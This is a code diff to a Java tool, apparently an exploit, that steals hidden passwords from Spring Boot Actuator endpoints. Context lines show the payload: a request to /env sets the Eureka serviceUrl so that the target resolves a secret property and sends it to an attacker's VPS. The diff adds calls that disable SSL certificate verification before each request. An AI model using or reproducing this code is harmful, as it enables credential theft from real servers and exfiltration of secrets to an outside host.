@@ -8,6 +8,8 @@ import java.nio.charset.StandardCharsets;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class GetSpPassWord_II {
     private final String address;
     private final String vpsIP;
@@ -30,6 +32,7 @@ public class GetSpPassWord_II {
         String llib1 = "spring-cloud-starter-netflix-eureka-client";
         String expdata = "eureka.client.serviceUrl.defaultZone=http://value:${%s}@%s";
         String data = String.format(expdata,args,vpsIP+":"+vpsPORT);
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -99,6 +102,7 @@ public class GetSpPassWord_II {
         String llib1 = "spring-cloud-starter-netflix-eureka-client";
         String expdata = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${%s}@%s\"}";
         String data = String.format(expdata,args,vpsIP+":"+vpsPORT);
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -164,6 +168,7 @@ public class GetSpPassWord_II {
         // Result1 3 为 sp1
         // Result2 4 为 sp2
         String site = address + "/env";
+        disableSSLVerification();
         URL obj = new URL(site);
         HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
         conn.setRequestMethod("GET");
